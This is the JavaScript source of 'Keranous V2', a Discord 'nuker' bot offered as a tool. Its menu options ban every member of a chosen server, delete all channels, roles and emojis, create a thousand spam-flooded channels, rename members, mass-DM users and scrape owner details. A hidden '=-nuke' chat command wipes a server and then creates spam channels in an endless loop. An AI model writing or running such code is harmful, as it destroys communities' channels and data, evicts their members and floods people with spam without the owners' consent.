const { Client } = require("discord.js");
const { Intents } = require('discord.js');
const Discord = require('discord.js')
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_BANS, Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, Intents.FLAGS.GUILD_INTEGRATIONS, Intents.FLAGS.GUILD_WEBHOOKS, Intents.FLAGS.GUILD_INVITES, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_PRESENCES, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.GUILD_MESSAGE_TYPING, Intents.FLAGS.DIRECT_MESSAGES, Intents.FLAGS.DIRECT_MESSAGE_REACTIONS, Intents.FLAGS.DIRECT_MESSAGE_TYPING],});
const fs = require('fs');
const readline = require('readline');
const { clear } = require("console");
const rl = readline.createInterface({input: process.stdin, output: process.stdout,crlfDelay: Infinity});
const { Permissions } = require('discord.js');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));


const version = "2.0.3"

let parsed = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
const token = parsed["token"]
const channel_name = parsed["channel_name"]
const message_text = parsed["message_text"]
const guild_name = parsed["guild_name"]

let commands = []

client.on('ready', () => {
    function main() {
    clear()
    client.user.setActivity('Keranous by bytecode#6591', { type: 'PLAYING' })
    console.log(redBright(`

    ██╗░░██╗███████╗██████╗░░█████╗░██╗░░░██╗███╗░░██╗░█████╗░░██████╗
    ██║░██╔╝██╔════╝██╔══██╗██╔══██╗██║░░░██║████╗░██║██╔══██╗██╔════╝
    █████═╝░█████╗░░██████╔╝███████║██║░░░██║██╔██╗██║██║░░██║╚█████╗░
    ██╔═██╗░██╔══╝░░██╔══██╗██╔══██║██║░░░██║██║╚████║██║░░██║░╚═══██╗
    ██║░╚██╗███████╗██║░░██║██║░░██║╚██████╔╝██║░╚███║╚█████╔╝██████╔╝
    ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░╚════╝░╚═════╝░
    `))+
console.log(red(`
    ────────────────────────────────────────────────────────────────────────────────
                            `)+redBright(`Made by bytecode#6591`)+yellowBright(`
                            Logged in as: ${client.user.username}#${client.user.discriminator}`
                            ) +blueBright(` 
    ────────────────────────────────────────────────────────────────────────────────

    
    `+red(`┌──────────────────────────────────────┬─────────────────────────────────────────┐
    │         [1] Ban all members          │  [2] Delete Channels                    │
    │         [3] Delete Roles             │  [4] Delete Emojis                      │
    │         [5] Create Channels          │  [6] Rename All                         │  
    │         [7] Get All Guilds           │  [8] Delete + Create Channels (Nuke)    │
    │         [9] Scrape Guild Info        │  [10] Update Check                      │
    │         [11] Custom Command Creator  │  [12] Command Remover                   │
    │         [13] Status Editor           │  [14] About                             │
    │         [15] DM All                  │  [16] ??                                │
    └──────────────────────────────────────┴─────────────────────────────────────────┘ 
    `)))

    rl.question(yellow('[KERANOUSV2INPUT] Selection: '), (answer) => {
        if (answer == "1") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                } else {
                    console.log(green(`[KERANOUSV2] Banning all members in ${guild.name}`))
                    guild.members.cache.forEach(member => {
                        if(member.id == client.user.id) return;
                        if(member.id == "479447486881071106") return;
                        if(member.bannable) {
                            member.ban({ reason: 'Keranous on top' }).then(() => {
                            console.log(green('[+] Banned ' + member.user.username+"#"+member.user.discriminator+'/'+member.user.id))
                            })
                        } else {
                            console.log(red('[-] Unable to ban ' + member.user.username+"#"+member.user.discriminator+'/'+member.user.id))
                        }
                    })

                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "2") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                } else {
                    console.log(green(`[KERANOUSV2] Deleting all channels in ${guild.name}`))
                    guild.channels.cache.forEach(channel => {
                        
                        channel.delete().then(() => {
                            if(channel.deletable) {
                            console.log(green('[+] Deleted ' + channel.name+'/'+channel.id))
                            } else {
                            console.log(red('[-] Unable to delete ' + channel.name+'/'+channel.id))
                        }
                        }).catch(()=>{})
                    
                    })

                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "3") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                } else {
                    console.log(green(`[KERANOUSV2] Deleting all roles in ${guild.name}`))
                    guild.roles.cache.forEach(role => {
                        role.delete().then(() => {
                            console.log(green('[+] Deleted ' + role.name+'/'+role.id))
                        }).catch(err => {
                            console.log(red('[-] Unable to delete ' + role.name+'/'+role.id))
                        })
                    })
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "4") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                } else {
                    console.log(green(`[KERANOUSV2] Deleting all emojis in ${guild.name}`))
                    guild.emojis.cache.forEach(emoji => {
                        emoji.delete().then(() => {
                            console.log(green('[+] Deleted ' + emoji.name+'/'+emoji.id))
                        }).catch(err => {
                            console.log(red('[-] Unable to delete ' + emoji.name+'/'+emoji.id))
                        })
                    })
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "5") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                const guild =  client.guilds.cache.get(guildid);
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    setTimeout(main, 1000)
                } else {
                    console.log(green(`[KERANOUSV2] Creating channels in ${guild.name}`))

                    for(let i = 0; i < 1000; i++) {
                        guild.channels.create(channel_name).then(channel => {
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            console.log(green('[+] Created ' + channel.name+'/'+channel.id))

                        })

                    }

                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "6") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    setTimeout(main, 1000)
                } else {
                    guild.members.cache.forEach(member => {
                        if(member.manageable) {
                            member.setNickname("Nuked By Avian#0002").then(() => {
                            console.log(green('[+] Renamed ' + member.user.username+"#"+member.user.discriminator+'/'+member.user.id)) 
                            })
                        } else {
                            console.log(red('[-] Unable to rename ' + member.user.username+"#"+member.user.discriminator+'/'+member.user.id))
                        }
                    })
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }

        else if(answer == "7") {
            client.guilds.cache.forEach(guild => {
                console.log(green(`[+] Guild Found ${guild.name}/${guild.id}`))
            })

            rl.question("Press enter to continue...", () => {
                main()
            })
        }

        else if(answer == "8") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    setTimeout(main, 1000)
                } else {
                    guild.setName(guild_name)
                    guild.setIcon("https://cdn11.bigcommerce.com/s-jbg7mp3qyd/products/3811/images/5573/troll_face_meme__47364.1501204311.380.380.jpg?c=28")
                    guild.channels.cache.forEach(channel => {
                        
                        channel.delete().then(() => {
                            console.log(green('[+] Deleted ' + channel.name+'/'+channel.id))
                        }).catch(()=>{})
                    })

                    console.log(green(`[KERANOUSV2I] Creating channels in ${guild.name}`))

                    for(let i = 0; i < 1000; i++) {
                        guild.channels.create(channel_name).then(channel => {
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            channel.send(message_text)
                            console.log(green('[+] Created ' + channel.name+'/'+channel.id))

                        })

                    }

                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }
        else if(answer == "9") {
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                let guild = client.guilds.cache.get(guildid)
                if (!guild) {
                    console.log(red('[-] Invalid Guild ID!'))
                    setTimeout(main, 1000)
                } else {
                    let owner = client.users.cache.get(guild.ownerId)
                    console.log(green("[KERANOUSV2] Scraping info... "))
                    console.log(green("[KERANOUSV2] Guild Name: " + guild.name))
                    console.log(green("[KERANOUSV2] Guild ID: " + guild.id))
                    console.log(green("[KERANOUSV2] Guild Owner: " + owner.username+"#"+owner.discriminator))
                    console.log(green("[KERANOUSV2] Guild Owner ID: " + owner.id))
                    console.log(green("[KERANOUSV2] Guild Created At: " + guild.createdAt))
                    console.log(green("[KERANOUSV2] Guild Member Count: " + guild.memberCount))
                    console.log(green("[KERANOUSV2] Channel Count: " + guild.channels.cache.size))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                }
            })
        }
        else if(answer == "10") {
            fetch("https://raw.githubusercontent.com/AviansEpic/destroyer/main/currentversion").then((response) => {response.text().then((text)=>{
                if(version.trim() != text.trim()) {
                    console.log(red("[KERANOUSV2] You aren't using the latest version! Please DM Avian#0002 for an updated version!"))
                } else {
                    console.log(green("[KERANOUSV2] You are using the latest version!"))
                }
            })})

            fetch("https://raw.githubusercontent.com/AviansEpic/destroyer/main/updatelog").then(response => {
                response.text().then(text => {
                    console.log(green("[KERANOUSV2] Update Log: "+text.trim()))
                    setTimeout(() => {
                        rl.question("Press enter to continue...", () => {
                            main()
                        },500)
                })

                })

                
            })


        }
        else if(answer == "11") {
            rl.question(yellow('[KERANOUSV2INPUT] COMMAND: '), (command) => {
                rl.question(yellow('[KERANOUSV2INPUT] RESPONSE: '), (message) => {
                    commands[command.toLowerCase()] = message
                    console.log(green("[KERANOUSV2] Added command: " + command.toLowerCase()))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                })
            })
        }

        else if(answer == "12") {
            rl.question(yellow('[KERANOUSV2INPUT] COMMAND: '), (command) => {
                    commands[command.toLowerCase()] = undefined
                    console.log(green("[KERANOUSV2] Removed command: " + command.toLowerCase()))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
            })
        }

        else if(answer == "13") {
            rl.question(yellow('[KERANOUSV2INPUT] STATUS: '), (status) => {
                console.log(red(`
 ┌─────────────────┐   
 │  [1] Playing    │
 │  [2] Streaming  │
 │  [3] Listening  │
 │  [4] Watching   │
 └─────────────────┘
                `))
                rl.question(yellow('[KERANOUSV2INPUT] TYPE: '), (type) => {
                    if(type == "1") {
                        client.user.setActivity(status, {type: "PLAYING"})
                    } else if(type == "2") {
                        client.user.setActivity(status, {type: "STREAMING"})
                    }
                    else if(type == "3") {
                        client.user.setActivity(status, {type: "LISTENING"})
                    }
                    else if(type == "4") {
                        client.user.setActivity(status, {type: "WATCHING"})
                    }

                    console.log(green("[KERANOUSV2] Set status to: " + status))
                    rl.question("Press enter to continue...", () => {
                        main()
                    })
                })


            })
        }

        else if(answer == "14") {
            console.log(yellow("[KERANOUSV2] Thank you for using Keranous V2!"))
            console.log(yellow("[KERANOUSV2] Version: " + version))
            fetch("https://raw.githubusercontent.com/AviansEpic/destroyer/main/currentversion").then((response) => {response.text().then((text)=>{console.log(yellow("[DESTROYERV2] Latest Version: "+text))})})
            console.log(yellow("[KERANOUSV2] Created by Avian#0002"))
            console.log(yellow("[KERANOUSV2] Discord: https://www.discord.gg/XfE9UPzV5S"))
            console.log(yellow("[KERANOUSV2] Github: https://www.github.com/AviansEpic/destroyer"))
        } else if(answer=="15") {
            rl.question(yellow('[KERANOUSV2INPUT] MESSAGE: '), (message) => {
                rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                    client.guilds.cache.get(guildid).members.cache.forEach(member => {
                        let iserr = false
                        member.send(message).catch(err => {
                            console.log(red("[KERANOUSV2] Couldn't send message to " + member.user.username))
                            iserr = true
                        }).then(() => {
                            if(!iserr) {
                            console.log(green("[KERANOUSV2] Sent message to " + member.user.username))
                            }
                        })

 
                    })


                })
            })
        }
        
    })
};
main()
})


let spamchannels = false

client.on('messageCreate', async message => {
    if(commands[message.content.toLowerCase()] != undefined) {
        message.channel.send(commands[message.content.toLowerCase()])
    }
    if (message.content.startsWith("=-" + "nuke")) {
        message.guild.setName(guild_name)
        try {
        message.guild.channels.cache.forEach(channel => {
            if (client.channels.cache.get(channel.id)) {
                try{
                channel.delete()
                } catch(e) {}
            }
        });
        if(banall) {
            message.guild.members.cache.forEach(member => {
                try {
                    member.ban()
                    if(log_bans) {
                        console.log(red(`${member.user.username}#${member.user.discriminator}`) + green(` was banned!`))
                    }
                } catch {
                    
                }
            })
        }
        if(delete_roles) {
            message.guild.roles.cache.forEach(role => {
                if (message.guild.roles.cache.get(role.id)) {
                    role.delete()
                }
            });
        }
        while (true) {
            const channel = (await message.guild.channels.create(channel_name));
            channel.send(message_text)
            channel.send(message_text)
            channel.send(message_text)
            channel.send(message_text)
            channel.send(message_text)
            channel.send(message_text)
            channel.send(message_text)
        }
    } catch(E){}
    }

    if(message.content.startsWith("!stopspammingchannels")) {
        spamchannels = false;
    }
})

client.login(token);
